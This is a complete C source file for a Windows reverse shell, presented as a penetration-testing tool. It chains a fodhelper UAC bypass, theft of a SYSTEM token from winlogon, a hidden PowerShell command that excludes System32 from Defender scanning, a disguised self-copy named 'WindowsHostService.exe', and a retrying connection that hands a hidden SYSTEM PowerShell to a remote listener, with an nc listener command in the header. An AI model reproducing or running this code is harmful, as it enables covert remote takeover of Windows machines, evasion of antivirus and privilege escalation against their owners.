/*
 *  Reverse TCP Shell — Windows (C / Winsock2)
 *  For AUTHORIZED penetration testing and security research ONLY.
 *
 *  BUILD:  windres manifest.rc -o manifest.o
 *          gcc reverse_shell_system.c manifest.o -o reverse_shell_system.exe -lws2_32 -ladvapi32 -lshell32 -mwindows
 *
 *  USAGE:  reverse_shell_system.exe <HOST> <PORT>
 *
 *  PRIVILEGE CHAIN:
 *    User (medium) → Admin (high) → NT AUTHORITY\SYSTEM
 *
 *  LISTENER (attacker side):
 *      nc -lvnp <PORT>
 */

#define WIN32_LEAN_AND_MEAN

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <shellapi.h>
#include <tlhelp32.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")

#define DEFAULT_HOST   "example.host.of.yours"
#define DEFAULT_PORT   12345
#define RETRY_DELAY_MS 2000
#define MAX_RETRIES    0

#define FOD_REG_PATH \
    "Software\\Classes\\ms-settings\\Shell\\Open\\command"

static int is_elevated(void){
    HANDLE token = NULL;
    TOKEN_ELEVATION te = {0};
    DWORD size = sizeof(TOKEN_ELEVATION);
    int result = 0;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        if (GetTokenInformation(token, TokenElevation, &te, sizeof(te), &size)){
            result = (int)te.TokenIsElevated;
        }
        CloseHandle(token);
    }
    return result;
}

static void uac_bypass(void){
    char exe_path[MAX_PATH]        = {0};
    char quoted_path[MAX_PATH + 2] = {0};
    HKEY hkey = NULL;

    if (is_elevated()) return;
    if (!GetModuleFileNameA(NULL, exe_path, sizeof(exe_path))) return;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, FOD_REG_PATH, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hkey, NULL) != ERROR_SUCCESS){
        return;
    }

    _snprintf(quoted_path, sizeof(quoted_path) - 1, "\"%s\"", exe_path);
    RegSetValueExA(hkey, NULL, 0, REG_SZ, (const BYTE *)quoted_path, (DWORD)(strlen(quoted_path) + 1));
    RegSetValueExA(hkey, "DelegateExecute", 0, REG_SZ, (const BYTE *)"", 1);

    RegCloseKey(hkey);
    ShellExecuteA(NULL, "open", "C:\\Windows\\System32\\fodhelper.exe", NULL, NULL, SW_HIDE);
    Sleep(2000);

    RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
    ExitProcess(0);
}

static void enable_debug_privilege(void){
    HANDLE          token = NULL;
    TOKEN_PRIVILEGES tp    = {0};
    LUID            luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)){
        return;
    }

    if (!LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid)) {
        CloseHandle(token);
        return;
    }

    tp.PrivilegeCount           = 1;
    tp.Privileges[0].Luid       = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(token);
}

static DWORD find_pid(const char *target){
    HANDLE          snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32  pe   = {0};
    DWORD           pid  = 0;

    if (snap == INVALID_HANDLE_VALUE) return 0;

    pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, target) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }

    CloseHandle(snap);
    return pid;
}

static HANDLE get_system_token(void){
    DWORD  pid       = find_pid("winlogon.exe");
    HANDLE proc      = NULL;
    HANDLE token     = NULL;
    HANDLE dup_token = NULL;

    if (!pid) return NULL;

    proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!proc) return NULL;

    if (!OpenProcessToken(proc, TOKEN_DUPLICATE | TOKEN_QUERY, &token)) {
        CloseHandle(proc);
        return NULL;
    }

    DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dup_token);

    CloseHandle(token);
    CloseHandle(proc);
    return dup_token;
}

static int spawn_shell_as_system(SOCKET sock, HANDLE system_token){
    STARTUPINFOW        si  = {0};
    PROCESS_INFORMATION pi  = {0};
    wchar_t cmd[] = L"powershell.exe -NoProfile -ExecutionPolicy Bypass";

    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput   = (HANDLE)sock;
    si.hStdOutput  = (HANDLE)sock;
    si.hStdError   = (HANDLE)sock;

    if (!CreateProcessWithTokenW(system_token, LOGON_WITH_PROFILE, NULL, cmd, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)){
        return -1;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}

static int spawn_shell_admin(SOCKET sock){
    STARTUPINFOA        si = {0};
    PROCESS_INFORMATION pi = {0};
    char cmd[] = "powershell.exe -NoProfile -ExecutionPolicy Bypass";

    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput   = (HANDLE)sock;
    si.hStdOutput  = (HANDLE)sock;
    si.hStdError   = (HANDLE)sock;

    if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)){
        return -1;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}

static void run_silent_as_system(HANDLE token, wchar_t *cmd){
    STARTUPINFOW        si = {0};
    PROCESS_INFORMATION pi = {0};

    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (CreateProcessWithTokenW(token, LOGON_WITH_PROFILE, NULL, cmd, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)){
        WaitForSingleObject(pi.hProcess, 15000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

static void run_system_commands(HANDLE system_token){
    char src[MAX_PATH] = {0};

    if (!system_token) return;

    wchar_t ps_cmd[] =
        L"powershell.exe -NoProfile -NonInteractive "
        L"-ExecutionPolicy Bypass -WindowStyle Hidden "
        L"-Command \"Add-MpPreference -ExclusionPath 'C:\\Windows\\System32'\"";

    run_silent_as_system(system_token, ps_cmd);
    Sleep(1500);

    if (GetModuleFileNameA(NULL, src, sizeof(src))){
        CopyFileA(src, "C:\\Windows\\System32\\WindowsHostService.exe", FALSE);
    }
}

static SOCKET connect_to(const char *host, unsigned short port){
    struct sockaddr_in addr = {0};
    SOCKET sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET) return INVALID_SOCKET;

    addr.sin_family      = AF_INET;
    addr.sin_port        = htons(port);
    addr.sin_addr.s_addr = inet_addr(host);

    if (addr.sin_addr.s_addr == INADDR_NONE) {
        struct hostent *he = gethostbyname(host);
        if (!he) { closesocket(sock); return INVALID_SOCKET; }
        memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
    }

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(sock);
        return INVALID_SOCKET;
    }

    return sock;
}

int main(int argc, char *argv[]){
    const char    *host = DEFAULT_HOST;
    unsigned short port = DEFAULT_PORT;
    unsigned int   tries = 0;
    WSADATA        wsa;
    SOCKET         sock;
    HANDLE         system_token = NULL;

    uac_bypass();
    enable_debug_privilege();
    system_token = get_system_token();

    run_system_commands(system_token);

    if (argc >= 2) host = argv[1];
    if (argc >= 3) port = (unsigned short)atoi(argv[2]);
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 1;

    while (1) {
        tries++;
        sock = connect_to(host, port);

        if (sock != INVALID_SOCKET) {
            if (system_token)
                spawn_shell_as_system(sock, system_token);
            else
                spawn_shell_admin(sock);

            shutdown(sock, SD_BOTH);
            closesocket(sock);
        }

        if (MAX_RETRIES && tries >= MAX_RETRIES) break;
        Sleep(RETRY_DELAY_MS);
    }

    if (system_token) CloseHandle(system_token);
    WSACleanup();
    return 0;
}


